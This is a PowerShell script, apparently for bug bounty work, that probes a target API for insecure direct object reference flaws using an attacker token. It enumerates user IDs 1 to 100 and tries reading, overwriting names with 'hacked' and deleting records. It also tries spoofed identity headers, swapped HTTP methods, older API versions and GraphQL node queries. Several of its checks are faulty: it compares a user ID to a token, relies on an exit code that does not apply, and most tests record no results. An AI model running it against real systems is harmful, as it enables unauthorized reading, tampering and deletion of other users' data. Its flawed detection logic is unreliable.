# Bug Hunter - IDOR Testing Tool
# Usage: ./test-idor.ps1 -Target <url> -VictimToken <token> -AttackerToken <token> -Endpoint <endpoint>

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,
    [string]$VictimToken,
    [string]$AttackerToken,
    [string]$Endpoint = "/api/users",
    [switch]$Read,
    [switch]$Write,
    [switch]$Delete
)

Write-Host "[*] IDOR Testing for: $Target" -ForegroundColor Cyan

$headers = @{
    "Authorization" = "Bearer $AttackerToken"
    "Content-Type" = "application/json"
}

$results = @()

# Test 1: Direct ID in URL
Write-Host "[*] Test 1: Direct ID manipulation..." -ForegroundColor Yellow

for ($id = 1; $id -le 100; $id++) {
    $url = "$Target$Endpoint/$id"
    
    if ($Read) {
        $response = Invoke-RestMethod -Uri $url -Headers $headers -UseBasicParsing -ErrorAction SilentlyContinue
        if ($response -and $response.user_id -ne $AttackerToken) {
            Write-Host "[!] IDOR READ: User ID $id accessible" -ForegroundColor Red
            $results += "IDOR-READ: User $id"
        }
    }
    
    if ($Write) {
        $body = @{"name" = "hacked"} | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method PUT -Headers $headers -Body $body -UseBasicParsing -ErrorAction SilentlyContinue
        if ($response -or $LASTEXITCODE -ne 403) {
            Write-Host "[!] IDOR WRITE: User ID $id modifiable" -ForegroundColor Red
            $results += "IDOR-WRITE: User $id"
        }
    }
    
    if ($Delete) {
        $response = Invoke-RestMethod -Uri $url -Method DELETE -Headers $headers -UseBasicParsing -ErrorAction SilentlyContinue
        if ($response -or $LASTEXITCODE -ne 403) {
            Write-Host "[!] IDOR DELETE: User ID $id deletable" -ForegroundColor Red
            $results += "IDOR-DELETE: User $id"
        }
    }
}

# Test 2: Body parameter manipulation
Write-Host "[*] Test 2: Body parameter manipulation..." -ForegroundColor Yellow

$url = "$Target$Endpoint"

$jsonTests = @(
    @{"user_id" = 1},
    @{"user_id" = 2},
    @{"id" = 1},
    @{"target_user_id" = 1},
    @{"owner_id" = 1}
)

foreach ($json in $jsonTests) {
    $body = $json | ConvertTo-Json
    try {
        $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $body -UseBasicParsing -ErrorAction SilentlyContinue
        Write-Host "[*] Tested: $($json | ConvertTo-Json)" -ForegroundColor Gray
    } catch {
        Write-Host "[*] Tested: $($json | ConvertTo-Json)" -ForegroundColor Gray
    }
}

# Test 3: Header injection
Write-Host "[*] Test 3: Header injection..." -ForegroundColor Yellow

$headerTests = @(
    @{Name="X-User-ID"; Value="1"},
    @{Name="X-User-ID"; Value="2"},
    @{Name="X-Org-ID"; Value="1"},
    @{Name="X-Forwarded-User"; Value="1"},
    @{Name="X-Remote-User"; Value="1"}
)

foreach ($header in $headerTests) {
    $testHeaders = $headers.Clone()
    $testHeaders[$header.Name] = $header.Value
    
    $url = "$Target$Endpoint/me"
    try {
        $response = Invoke-RestMethod -Uri $url -Headers $testHeaders -UseBasicParsing -ErrorAction SilentlyContinue
    } catch {}
}

# Test 4: Method swap
Write-Host "[*] Test 4: Method swap..." -ForegroundColor Yellow

$methods = @("GET", "PUT", "PATCH", "DELETE", "POST")

foreach ($method in $methods) {
    $url = "$Target$Endpoint/1"
    try {
        $response = Invoke-RestMethod -Uri $url -Method $method -Headers $headers -UseBasicParsing -ErrorAction SilentlyContinue
    } catch {}
}

# Test 5: Version rollback
Write-Host "[*] Test 5: Version rollback..." -ForegroundColor Yellow

$versions = @("/api/v1", "/api/v2", "/api", "/api.php", "/api/v1.0")

foreach ($ver in $versions) {
    $url = "$Target$ver/users/1"
    try {
        $response = Invoke-RestMethod -Uri $url -Method GET -Headers $headers -UseBasicParsing -ErrorAction SilentlyContinue
    } catch {}
}

# Test 6: GraphQL node bypass
Write-Host "[*] Test 6: GraphQL node testing..." -ForegroundColor Yellow

$graphqlQueries = @(
    '{ node(id: "dXNlcjox") { ... on User { email } } }',
    '{ node(id: "YWNjb3VudDox") { ... on Account { name } } }',
    '{ user(id: 1) { email } }'
)

foreach ($query in $graphqlQueries) {
    $body = @{query = $query} | ConvertTo-Json
    $url = "$Target/graphql"
    
    try {
        $response = Invoke-RestMethod -Uri $url -Method POST -Headers $headers -Body $body -UseBasicParsing -ErrorAction SilentlyContinue
    } catch {}
}

Write-Host "[*] IDOR testing complete" -ForegroundColor Green
Write-Host "[*] Found $($results.Count) potential IDOR vulnerabilities" -ForegroundColor Cyan